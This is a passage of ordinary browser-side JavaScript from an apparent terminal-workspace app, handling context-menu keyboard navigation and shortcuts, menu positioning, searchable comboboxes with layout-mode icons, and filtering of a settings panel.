    const formatted = formatContextShortcut(binding);
    ctxShortcutCapture = null;
    ctxShortcutStatus = displacedActionId
      ? `Assigned ${formatted} to ${capture.label}; removed it from ${contextShortcutActionLabel(displacedActionId)}.`
      : `Assigned ${formatted} to ${capture.label}.`;
    rerenderOpenContextMenu();
    stop();
    return;
  }

  if (!ctxShortcutEditing) {
    const binding = contextShortcutFromEvent(event);
    const signature = contextShortcutSignature(binding);
    const customTarget = signature ? ctxByShortcut.get(signature) : null;
    const searchInput = event.target instanceof Element
      ? event.target.closest(".ctx-menu-search-input")
      : null;
    const modified = binding && (binding.ctrl || binding.alt || binding.shift || binding.meta);
    if (customTarget && (!searchInput || modified || searchInput.value === "")) {
      customTarget.click();
      stop();
      return;
    }
  }

  const pendingSearchInput = elements.contextMenu.querySelector(".ctx-menu-search-input");
  if (pendingSearchInput
      && event.target !== pendingSearchInput
      && !event.ctrlKey
      && !event.altKey
      && !event.metaKey
      && key.length === 1) {
    pendingSearchInput.value += key;
    filterContextMenu(pendingSearchInput.value);
    pendingSearchInput.focus({ preventScroll: true });
    stop();
    return;
  }

  if (event.target instanceof Element && event.target.closest(".ctx-menu-search-input")) {
    if (key === "Escape") {
      hideContextMenu();
      stop();
    } else if (key === "ArrowDown" || (key === "Tab" && !event.shiftKey)) {
      elements.contextMenu.focus({ preventScroll: true });
      setContextFocus(0);
      stop();
    } else if (key === "ArrowUp" || (key === "Tab" && event.shiftKey)) {
      elements.contextMenu.focus({ preventScroll: true });
      setContextFocus(ctxFocusables.length - 1);
      stop();
    } else if (key === "Enter") {
      const target = ctxFocusables[ctxKeyIndex] || ctxFocusables[0];
      if (target) target.click();
      stop();
    }
    return;
  }

  // Once the submenu holds the keyboard (entered with ArrowRight), it owns
  // navigation until ArrowLeft/Escape hands control back to the parent menu.
  if (!elements.contextSubmenu.hidden && subKeyIndex >= 0) {
    if (key === "ArrowDown") {
      moveSubmenuFocus(1);
      stop();
      return;
    }
    if (key === "ArrowUp") {
      moveSubmenuFocus(-1);
      stop();
      return;
    }
    if (key === "Home") {
      setSubmenuFocus(0);
      stop();
      return;
    }
    if (key === "End") {
      setSubmenuFocus(subFocusables.length - 1);
      stop();
      return;
    }
    if (key === "Enter" || key === " ") {
      const el = subFocusables[subKeyIndex];
      if (el) el.click();
      stop();
      return;
    }
    if (key === "ArrowLeft" || key === "Escape") {
      hideContextSubmenu();
      stop();
      return;
    }
    // Any other key is swallowed so it never leaks into the terminal beneath.
    stop();
    return;
  }

  // A submenu opened by hover (no keyboard focus in it yet) is stale the instant
  // the keyboard drives the parent menu, so dismiss it on any key except the one
  // that steps into it.
  if (!elements.contextSubmenu.hidden && key !== "ArrowRight") hideContextSubmenu();

  if (key === "Escape") {
    hideContextMenu();
    stop();
    return;
  }
  if (key === "ArrowRight") {
    const el = ctxFocusables[ctxKeyIndex];
    const items = el ? ctxSubmenus.get(el) : null;
    if (items && items.some((entry) => entry.run)) {
      openContextSubmenuFor(el, items);
      setSubmenuFocus(0);
    }
    stop();
    return;
  }
  if (key === "ArrowDown") {
    moveContextFocus(1);
    stop();
    return;
  }
  if (key === "ArrowUp") {
    moveContextFocus(-1);
    stop();
    return;
  }
  if (key === "Tab") {
    moveContextFocus(event.shiftKey ? -1 : 1);
    stop();
    return;
  }
  if (key === "Home") {
    setContextFocus(0);
    stop();
    return;
  }
  if (key === "End") {
    setContextFocus(ctxFocusables.length - 1);
    stop();
    return;
  }
  if (key === "Enter" || key === " ") {
    const el = ctxFocusables[ctxKeyIndex];
    if (el) el.click();
    // Swallow either way so a stray Enter never reaches the terminal while the
    // menu is up.
    stop();
    return;
  }

  // Accelerators are single, unmodified key presses so app-wide chords still work.
  if (event.ctrlKey || event.altKey || event.metaKey || key.length !== 1) return;
  let target = null;
  if (key >= "1" && key <= "9") target = ctxByNumber.get(key);
  else if (/[a-z]/i.test(key)) target = ctxByLetter.get(key.toLowerCase());
  if (target && !target.hidden && !target.closest(".ctx-group")?.hidden) target.click();
  // Whether or not it matched, keep the keystroke from reaching the terminal.
  stop();
}

function showContextMenu(x, y, terminal, selection) {
  buildContextMenu(terminal, selection);
  showBuiltContextMenu(x, y, { returnFocus: terminal.term.textarea || terminal.screen });
}

function showSurfaceContextMenu(x, y) {
  buildSurfaceContextMenu();
  showBuiltContextMenu(x, y);
}

function showPaneOverflowMenu(button, terminal) {
  if (!elements.terminalNotificationFlyout.hidden) closeTerminalNotificationFlyout();
  buildPaneOverflowMenu(terminal);
  button.setAttribute("aria-expanded", "true");
  const rect = button.getBoundingClientRect();
  showBuiltContextMenu(rect.right, rect.bottom + 4, { alignRight: true });
}

// Right-clicking the PID pill reports on the session behind it. Built fresh each
// time so the elapsed time is current.
function showSessionInfoMenu(terminal) {
  const launched = formatLaunchTimestamp(terminal.startedAt);
  const items = [];

  if (launched) {
    items.push({ info: true, icon: "calendar-clock", label: `Launched ${launched}` });
    if (terminal.status !== "exited" && terminal.status !== "error") {
      items.push({ info: true, icon: "timer", label: `Up ${formatUptime(terminal.startedAt)}` });
    }
  } else {
    items.push({ info: true, icon: "calendar-clock", label: "Launch time unavailable" });
  }

  if (terminal.pid != null) {
    items.push({ info: true, icon: "hash", label: `PID ${terminal.pid}` });
  }

  const details = [
    terminal.titleInput.value,
    terminal.pid != null ? `PID ${terminal.pid}` : null,
    launched ? `launched ${launched}` : null,
    terminal.shell || null,
    terminal.cwd || null
  ]
    .filter(Boolean)
    .join("\n");

  items.push({ separator: true });
  items.push({
    label: "Copy session details",
    icon: "clipboard-copy",
    run: () =>
      writeClipboardText(details).then(
        () => toast("Session details copied", "success", 1600),
        () => toast("Copy failed", "error", 1800)
      )
  });

  renderContextMenu(items);
  // Anchored to the pill rather than the pointer, growing up and to the left, so
  // it reads as belonging to the pill and never covers it. The pill lives in the
  // bottom-right of a pane, which is the only direction with room anyway.
  const rect = terminal.statusElement.getBoundingClientRect();
  showBuiltContextMenu(rect.right, rect.top - 6, { alignRight: true, alignBottom: true });
}

function showBuiltContextMenu(x, y, { alignRight = false, alignBottom = false, returnFocus = null } = {}) {
  const menu = elements.contextMenu;
  if (menu.hidden) {
    ctxReturnFocus = returnFocus instanceof HTMLElement
      ? returnFocus
      : document.activeElement instanceof HTMLElement && !menu.contains(document.activeElement)
      ? document.activeElement
      : null;
  }
  // The menu must be displayable to measure it, but must not paint at the
  // temporary 0,0 measurement position before its final coordinates are set.
  menu.classList.add("is-positioning");
  menu.hidden = false;
  menu.style.left = "0px";
  menu.style.top = "0px";

  // Swap the <i data-lucide> placeholders for real SVGs *before* measuring.
  // Placeholders occupy no width, so measuring first reports a menu ~16px
  // narrower than the one that ends up on screen, and every right/bottom-aligned
  // menu lands 16px off its anchor.
  refreshIcons(menu);

  // x/y name the corner the menu should hang from: alignRight grows it leftward,
  // alignBottom grows it upward. Clamping still wins, so a menu anchored near an
  // edge stays on screen rather than honouring the requested direction.
  const rect = menu.getBoundingClientRect();
  const desiredLeft = alignRight ? x - rect.width : x;
  const desiredTop = alignBottom ? y - rect.height : y;
  const left = Math.max(8, Math.min(desiredLeft, window.innerWidth - rect.width - 8));
  const top = Math.max(8, Math.min(desiredTop, window.innerHeight - rect.height - 8));
  menu.style.left = `${left}px`;
  menu.style.top = `${top}px`;
  menu.classList.remove("is-positioning");
  const searchInput = menu.querySelector(".ctx-menu-search-input");
  if (searchInput) {
    const focusRequest = ++ctxSearchFocusRequest;
    const focusSearch = () => {
      if (focusRequest !== ctxSearchFocusRequest || menu.hidden || !searchInput.isConnected) return true;
      const active = document.activeElement;
      if (active !== searchInput && menu.contains(active)) return true;
      if (active instanceof HTMLElement && active !== document.body && active !== searchInput) {
        active.blur();
      }
      searchInput.focus({ preventScroll: true });
      searchInput.select();
      return document.activeElement === searchInput;
    };
    let attempts = 0;
    const retryFocus = () => {
      if (focusSearch() || attempts >= 8) return;
      attempts += 1;
      window.setTimeout(retryFocus, 25);
    };
    // Chromium temporarily rejects programmatic focus after some right-click
    // gestures. Retry for at most 200 ms, while the same menu stays open and no
    // menu control has taken focus.
    retryFocus();
  }
}

function hideContextMenu() {
  hideContextSubmenu();
  if (!elements.contextMenu.hidden) {
    ctxSearchFocusRequest += 1;
    elements.contextMenu.hidden = true;
    ctxKeyIndex = -1;
    ctxFocusables = [];
    ctxAllFocusables = [];
    ctxReturnFocus = null;
    ctxShortcutCapture = null;
    ctxShortcutEditing = false;
    ctxShortcutStatus = "";
    ctxRenderedItems = [];
    ctxRenderOptions = {};
    ctxCustomizationModel = null;
    ctxCustomizationDrag = null;
    ctxSectionDrag = null;
    ctxEditingSectionId = null;
    ctxNewSectionId = null;
    ctxShowHiddenItems = false;
    ctxSuppressCustomizationClick = false;
    clearContextCustomizationDropIndicators();
    elements.contextMenu.removeAttribute("aria-activedescendant");
  }
  for (const button of elements.host.querySelectorAll('button[data-action="more"][aria-expanded="true"]')) {
    button.setAttribute("aria-expanded", "false");
  }
}

/* ---------------- Searchable comboboxes --------------- */

const comboSelects = [];
let openCombo = null;

const LAYOUT_MODE_GLYPHS = {
  auto: [[1, 1, 6, 4], [8, 1, 3, 4], [1, 6, 4, 3], [6, 6, 5, 3]],
  columns: [[1, 1, 4, 8], [7, 1, 4, 8]],
  rows: [[1, 1, 10, 3], [1, 6, 10, 3]],
  horizontal: [[1, 1, 3, 8], [5, 1, 3, 8], [9, 1, 2, 8]],
  vertical: [[1, 1, 10, 2], [1, 4, 10, 2], [1, 7, 10, 2]],
  focus: [[1, 1, 7, 8], [9, 1, 2, 2], [9, 4, 2, 2], [9, 7, 2, 2]],
  grid: [[1, 1, 4, 3], [7, 1, 4, 3], [1, 6, 4, 3], [7, 6, 4, 3]],
  "master-top": [[1, 1, 10, 5], [1, 7, 2, 2], [5, 7, 2, 2], [9, 7, 2, 2]],
  "master-right": [[1, 1, 3, 2], [1, 4, 3, 2], [1, 7, 3, 2], [5, 1, 6, 8]],
  "master-bottom": [[1, 1, 2, 2], [5, 1, 2, 2], [9, 1, 2, 2], [1, 4, 10, 5]],
  "master-left": [[1, 1, 6, 8], [8, 1, 3, 2], [8, 4, 3, 2], [8, 7, 3, 2]],
  "priority-grid": [[1, 1, 6, 5], [8, 1, 3, 5], [1, 7, 3, 2], [5, 7, 3, 2], [9, 7, 2, 2]],
  "compact-matrix": [
    [1, 1, 2, 2], [5, 1, 2, 2], [9, 1, 2, 2],
    [1, 4, 2, 2], [5, 4, 2, 2], [9, 4, 2, 2],
    [1, 7, 2, 2], [5, 7, 2, 2], [9, 7, 2, 2]
  ],
  "carousel-horizontal": [[1, 2, 2, 6], [4, 1, 4, 8], [9, 2, 2, 6]],
  "carousel-vertical": [[3, 1, 6, 2], [2, 4, 8, 3], [3, 8, 6, 1]],
  spotlight: [[1, 3, 2, 4], [4, 1, 6, 8], [11, 3, 1, 4]],
  bento: [[1, 1, 6, 5], [8, 1, 3, 3], [8, 5, 3, 4], [1, 7, 3, 2], [5, 7, 2, 2]],
  manual: [[1, 2, 5, 5], [5, 1, 6, 5], [3, 5, 6, 4]]
};

function createLayoutModeGlyph(layout) {
  const glyph = document.createElement("span");
  glyph.className = "layout-mode-glyph";
  glyph.dataset.layoutMode = layout;
  glyph.setAttribute("aria-hidden", "true");
  const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
  svg.setAttribute("viewBox", "0 0 12 10");
  for (const [x, y, width, height] of LAYOUT_MODE_GLYPHS[layout]) {
    const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
    rect.setAttribute("x", String(x));
    rect.setAttribute("y", String(y));
    rect.setAttribute("width", String(width));
    rect.setAttribute("height", String(height));
    rect.setAttribute("rx", "0.6");
    svg.append(rect);
  }
  glyph.append(svg);
  return glyph;
}

function createComboboxOptionIcon(option) {
  const iconName = option?.dataset.icon;
  if (!iconName) return null;
  const icon = document.createElement("i");
  icon.className = "combobox-option-icon";
  icon.dataset.lucide = iconName;
  icon.setAttribute("aria-hidden", "true");
  return icon;
}

function enhanceComboboxes() {
  const targets = [
    elements.shellSelect,
    elements.layoutMode,
    elements.pagerPlacement,
    elements.appTheme,
    elements.fontFamily,
    elements.headerActionDragScope,
    elements.cursorStyle,
    elements.terminalTheme,
    elements.rightClickAction,
    elements.workspaceSelect
  ];
  for (const select of targets) {
    if (select && !select._combo) {
      enhanceSelect(select);
      comboSelects.push(select);
    }
  }
  window.addEventListener("scroll", (event) => {
    if (openCombo?.ownsScrollTarget(event.target)) return;
    openCombo?.close();
  }, true);
  window.addEventListener("resize", () => openCombo?.close());
  refreshIcons();
}

function refreshComboboxes() {
  for (const select of comboSelects) select._combo?.sync();
}

function enhanceSelect(select) {
  const wrap = document.createElement("div");
  wrap.className = "combobox";
  const showsLayoutGlyph = select === elements.layoutMode;
  const showsOptionIcon = [...select.options].some((option) => option.dataset.icon);
  if (showsLayoutGlyph) wrap.classList.add("layout-mode-combobox");
  if (showsOptionIcon) wrap.classList.add("option-icon-combobox");
  select.parentNode.insertBefore(wrap, select);
  wrap.append(select);
  select.classList.add("combobox-native");
  select.setAttribute("tabindex", "-1");

  const input = document.createElement("input");
  input.type = "text";
  input.className = "combobox-input";
  input.autocomplete = "off";
  input.spellcheck = false;
  input.setAttribute("role", "combobox");
  input.setAttribute("aria-expanded", "false");
  input.setAttribute("aria-label", select.getAttribute("aria-label") || select.id || "Select");

  const chevron = document.createElement("i");
  chevron.className = "combobox-chevron";
  chevron.setAttribute("data-lucide", "chevron-down");

  const list = document.createElement("ul");
  list.className = "combobox-list";
  list.setAttribute("role", "listbox");
  list.hidden = true;
  document.body.append(list);

  let selectedGlyph = null;
  if (showsLayoutGlyph) {
    selectedGlyph = createLayoutModeGlyph(select.value);
    selectedGlyph.classList.add("combobox-selected-glyph", "layout-mode-glyph-selected");
  } else if (showsOptionIcon) {
    selectedGlyph = createComboboxOptionIcon(select.options[select.selectedIndex]);
    selectedGlyph?.classList.add("combobox-selected-glyph");
  }
  wrap.append(input);
  if (selectedGlyph) wrap.append(selectedGlyph);
  wrap.append(chevron);

  const box = { open: false, index: 0, items: [] };

  const currentLabel = () => {
    const opt = select.options[select.selectedIndex];
    return opt ? opt.textContent : "";
  };

  const positionList = () => {
    const r = input.getBoundingClientRect();
    const height = Math.min(264, list.scrollHeight || 264);
    const spaceBelow = window.innerHeight - r.bottom;
    list.style.left = `${r.left}px`;
    list.style.width = `${r.width}px`;
    if (spaceBelow < height + 12 && r.top > spaceBelow) {
      list.style.top = `${Math.max(8, r.top - 4 - height)}px`;
    } else {
      list.style.top = `${r.bottom + 4}px`;
    }
  };

  const render = (filter) => {
    const query = (filter || "").toLowerCase();
    box.items = [...select.options].filter((o) => !o.disabled && (!query || o.textContent.toLowerCase().includes(query)));
    list.innerHTML = "";

    if (box.items.length === 0) {
      const empty = document.createElement("li");
      empty.className = "combobox-empty";
      empty.textContent = "No matches";
      list.append(empty);
      if (box.open) positionList();
      return;
    }

    box.index = query ? 0 : Math.max(0, box.items.findIndex((o) => o.value === select.value));
    box.items.forEach((o, i) => {
      const li = document.createElement("li");
      li.className = `combobox-option${i === box.index ? " is-active" : ""}`;
      if (showsLayoutGlyph) li.append(createLayoutModeGlyph(o.value));
      else if (showsOptionIcon) {
        const optionIcon = createComboboxOptionIcon(o);
        if (optionIcon) li.append(optionIcon);
      }
      const label = document.createElement("span");
      label.className = "combobox-option-label";
      label.textContent = o.textContent;
      li.append(label);
      li.setAttribute("role", "option");
      li.setAttribute("aria-selected", String(o.value === select.value));
      li.addEventListener("mousedown", (event) => {
        event.preventDefault();
        choose(o);
      });
      list.append(li);
    });
    if (showsOptionIcon) refreshIcons(list);
    if (box.open) positionList();
  };

  const highlight = () => {
    [...list.children].forEach((li, i) => li.classList.toggle("is-active", i === box.index));
    list.children[box.index]?.scrollIntoView({ block: "nearest" });
  };

  const move = (delta) => {
    if (box.items.length === 0) return;
    box.index = (box.index + delta + box.items.length) % box.items.length;
    highlight();
  };

  function choose(option) {
    if (option && select.value !== option.value) {
      select.value = option.value;
      select.dispatchEvent(new Event("change", { bubbles: true }));
    }
    close();
  }

  const open = () => {
    if (box.open) return;
    if (openCombo && openCombo !== api) openCombo.close();
    box.open = true;
    openCombo = api;
    wrap.classList.add("is-open");
    input.setAttribute("aria-expanded", "true");
    list.hidden = false;
    render("");
    positionList();
    input.select();
  };

  const close = () => {
    if (!box.open) return;
    box.open = false;
    openCombo = null;
    wrap.classList.remove("is-open");
    input.setAttribute("aria-expanded", "false");
    list.hidden = true;
    sync();
  };

  const sync = () => {
    if (!box.open) {
      input.value = currentLabel();
      if (showsLayoutGlyph || showsOptionIcon) {
        const replacement = showsLayoutGlyph
          ? createLayoutModeGlyph(select.value)
          : createComboboxOptionIcon(select.options[select.selectedIndex]);
        const currentGlyph = wrap.querySelector(".combobox-selected-glyph");
        if (replacement) {
          replacement.classList.add("combobox-selected-glyph");
          if (showsLayoutGlyph) replacement.classList.add("layout-mode-glyph-selected");
          if (currentGlyph) currentGlyph.replaceWith(replacement);
          else input.insertAdjacentElement("afterend", replacement);
          if (showsOptionIcon) refreshIcons(wrap);
        } else {
          currentGlyph?.remove();
        }
      }
    }
  };

  input.addEventListener("focus", open);
  input.addEventListener("pointerdown", () => {
    if (!box.open) open();
  });
  input.addEventListener("input", () => render(input.value));
  input.addEventListener("keydown", (event) => {
    if (event.key === "ArrowDown") {
      event.preventDefault();
      box.open ? move(1) : open();
    } else if (event.key === "ArrowUp") {
      event.preventDefault();
      move(-1);
    } else if (event.key === "Enter") {
      event.preventDefault();
      choose(box.items[box.index]);
    } else if (event.key === "Escape") {
      event.preventDefault();
      close();
    } else if (event.key === "Tab") {
      close();
    }
  });
  input.addEventListener("blur", () => {
    window.setTimeout(() => {
      if (box.open) close();
    }, 120);
  });

  const api = {
    close,
    ownsScrollTarget: (target) => target === list || target instanceof Node && list.contains(target),
    sync
  };
  select._combo = api;
  sync();
}

const settingsPanelGroups = [];
const settingsSearchTextCache = new WeakMap();
let settingsSearchSnapshot = null;

function normalizeSettingsSearchText(value) {
  return String(value || "")
    .normalize("NFKD")
    .replace(/[\u0300-\u036f]/g, "")
    .toLocaleLowerCase()
    .replace(/[^a-z0-9]+/g, " ")
    .trim();
}

function settingsItemSearchText(item) {
  const cached = settingsSearchTextCache.get(item);
  if (cached !== undefined) return cached;
  const parts = [item.textContent];
  const indexedElements = [item, ...item.querySelectorAll("[id], [title], [placeholder], [aria-label], [value]")];
  const aliases = [];
  for (const element of indexedElements) {
    parts.push(
      element.id,
      element.getAttribute("title"),
      element.getAttribute("placeholder"),
      element.getAttribute("aria-label"),
      element.getAttribute("value")
    );
    if (element.id && SETTINGS_SEARCH_ALIASES[element.id]) aliases.push(SETTINGS_SEARCH_ALIASES[element.id]);
  }
  if (aliases.length > 0) item.dataset.searchAliases = aliases.join(" ");
  parts.push(item.dataset.searchAliases);
  const searchText = normalizeSettingsSearchText(parts.filter(Boolean).join(" "));
  settingsSearchTextCache.set(item, searchText);
  return searchText;
}

function invalidateSettingsSearchItem(element) {
  const item = element?.closest?.(".settings-filter-item");
  if (!item) return;
  settingsSearchTextCache.delete(item);
  settingsItemSearchText(item);
  if (elements.settingsSearch?.value) applySettingsFilter();
}

function settingsSearchMatches(searchText, query, queryTerms) {
  return searchText.includes(query) || queryTerms.every((term) => searchText.includes(term));
}

function setSettingsGroupExpanded(group, expanded) {
  group.expanded = Boolean(expanded);
  if (!group.expanded) openCombo?.close();
  group.button.setAttribute("aria-expanded", String(group.expanded));
  group.body.hidden = !group.expanded;
}

function updateSettingsShowAllButton() {
  const searching = Boolean(normalizeSettingsSearchText(elements.settingsSearch.value));
  const allExpanded = !searching && settingsPanelGroups.every((group) => group.expanded);
  const label = allExpanded ? "Collapse all settings" : "Show all settings";
  elements.settingsShowAll.title = label;
  elements.settingsShowAll.setAttribute("aria-label", label);
  elements.settingsShowAll.setAttribute("aria-pressed", String(allExpanded));
}

function applySettingsFilter() {
  openCombo?.close();
  const query = normalizeSettingsSearchText(elements.settingsSearch.value);
  elements.controlPanel.classList.toggle("is-settings-filtering", Boolean(query));
  if (query && !settingsSearchSnapshot) {
    settingsSearchSnapshot = new Map(settingsPanelGroups.map((group) => [group, group.expanded]));
  }

  if (!query) {
    for (const group of settingsPanelGroups) {
      group.section.hidden = false;
      for (const item of group.items) {
        item.hidden = false;
        item.classList.remove("is-settings-match");
      }
      if (settingsSearchSnapshot) setSettingsGroupExpanded(group, settingsSearchSnapshot.get(group));
    }
    settingsSearchSnapshot = null;
    elements.controlPanel.querySelector(".settings-filter-empty")?.remove();
    updateSettingsShowAllButton();
    return;
  }

  let matchCount = 0;
  const queryTerms = query.split(" ");
  for (const group of settingsPanelGroups) {
    const headingMatches = settingsSearchMatches(group.searchText, query, queryTerms);
    let groupMatches = 0;
    for (const item of group.items) {
      const matches = headingMatches || settingsSearchMatches(settingsItemSearchText(item), query, queryTerms);
      item.hidden = !matches;
      item.classList.toggle("is-settings-match", matches);
      if (matches) groupMatches += 1;
    }
    group.section.hidden = groupMatches === 0;
    if (groupMatches > 0) {
      matchCount += groupMatches;
      setSettingsGroupExpanded(group, true);
    }
  }

  let empty = elements.controlPanel.querySelector(".settings-filter-empty");
  if (matchCount === 0) {
    if (!empty) {
      empty = document.createElement("p");
      empty.className = "settings-filter-empty";
      empty.textContent = "No matching settings.";
      elements.settingsShowAll.closest(".settings-panel-sticky").insertAdjacentElement("afterend", empty);
    }
  } else {
    empty?.remove();
  }
  updateSettingsShowAllButton();
}

function toggleAllSettingsGroups() {
  const wasSearching = Boolean(elements.settingsSearch.value);
  if (wasSearching) {
    elements.settingsSearch.value = "";
    applySettingsFilter();
  }
  const expand = wasSearching || !settingsPanelGroups.every((group) => group.expanded);
  for (const group of settingsPanelGroups) setSettingsGroupExpanded(group, expand);
  updateSettingsShowAllButton();
}

function initializeSettingsPanel() {
  const sections = [...elements.controlPanel.children].filter((child) => child.matches("section.control-section"));
  sections.forEach((section, index) => {
    const heading = section.querySelector(":scope > h2");
    const label = heading?.textContent.trim() || (section.classList.contains("action-grid") ? "Actions" : `Settings ${index + 1}`);
    const slug = label.toLocaleLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "") || `group-${index + 1}`;
    const button = document.createElement("button");
    button.type = "button";
    button.className = "settings-group-toggle";
    button.id = `settings-group-${slug}`;
    button.setAttribute("aria-expanded", "false");
    const buttonLabel = document.createElement("span");
    buttonLabel.textContent = label;
    const chevron = document.createElement("i");
    chevron.dataset.lucide = "chevron-down";
    chevron.setAttribute("aria-hidden", "true");
    button.append(buttonLabel, chevron);

    const body = document.createElement("div");
    body.className = "settings-group-body";
    body.id = `settings-body-${slug}`;
    body.hidden = true;
    button.setAttribute("aria-controls", body.id);
    const items = [...section.children].filter((child) => child !== heading);
    for (const item of items) {
      item.classList.add("settings-filter-item");
      settingsItemSearchText(item);
      body.append(item);
    }
    heading?.remove();
    section.append(button, body);

    const group = {
      body,
      button,
      expanded: false,
      items,
      searchText: normalizeSettingsSearchText(label),
      section
    };
    settingsPanelGroups.push(group);
    button.addEventListener("click", () => {
      setSettingsGroupExpanded(group, !group.expanded);
      updateSettingsShowAllButton();
    });
  });

  elements.settingsSearch.addEventListener("input", applySettingsFilter);
  elements.settingsSearch.addEventListener("keydown", (event) => {
    if (event.key !== "Escape" || !elements.settingsSearch.value) return;
    event.preventDefault();
    elements.settingsSearch.value = "";
    applySettingsFilter();
  });
  elements.settingsShowAll.addEventListener("click", toggleAllSettingsGroups);
  updateSettingsShowAllButton();
}

function normalizeWorkspaceZoom(value) {
  const requested = Number(value);
  return Number.isFinite(requested)
    ? Math.min(
        WORKSPACE_ZOOM_BOUNDS.max,
        Math.max(
          WORKSPACE_ZOOM_BOUNDS.min,
          Math.round(requested / WORKSPACE_ZOOM_BOUNDS.step) * WORKSPACE_ZOOM_BOUNDS.step
        )
      )
    : WORKSPACE_ZOOM_BOUNDS.fallback;
}